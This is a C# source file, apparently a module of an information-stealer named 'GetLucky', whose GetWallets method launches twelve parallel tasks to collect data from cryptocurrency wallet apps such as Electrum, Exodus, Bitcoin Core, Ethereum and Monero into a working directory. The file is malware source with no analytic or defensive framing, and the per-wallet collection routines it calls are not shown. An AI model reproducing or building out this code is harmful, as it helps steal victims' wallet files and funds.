using System.Threading;
using System.Threading.Tasks;

namespace GetLucky
{
    class Wallets
    {
        public static int count = 0;

        public static int GetWallets(string GetLucky_Dir)
        {
            Task[] tasks_wl = new Task[12]
   {
        new Task(() =>  Armory.ArmoryStr(GetLucky_Dir)),
        new Task(() => AtomicWallet.AtomicStr(GetLucky_Dir)),
        new Task(() => BitcoinCore.BCStr(GetLucky_Dir)),
        new Task(() => Bytecoin.BCNcoinStr(GetLucky_Dir)),
        new Task(() => DashCore.DSHcoinStr(GetLucky_Dir)),
        new Task(() => Electrum.EleStr(GetLucky_Dir)),
        new Task(() => Ethereum.EcoinStr(GetLucky_Dir)),
        new Task(() => LitecoinCore.LitecStr(GetLucky_Dir)),
        new Task(() => Monero.XMRcoinStr(GetLucky_Dir)),
        new Task(() => Exodus.ExodusStr(GetLucky_Dir)),
        new Task(() => Jaxx.JaxxStr(GetLucky_Dir)),
        new Task(() => Zcash.ZecwalletStr(GetLucky_Dir))
   };
            foreach (var t in tasks_wl)
                t.Start();
            Task.WaitAll(tasks_wl);

            return count;
        }
    }
}
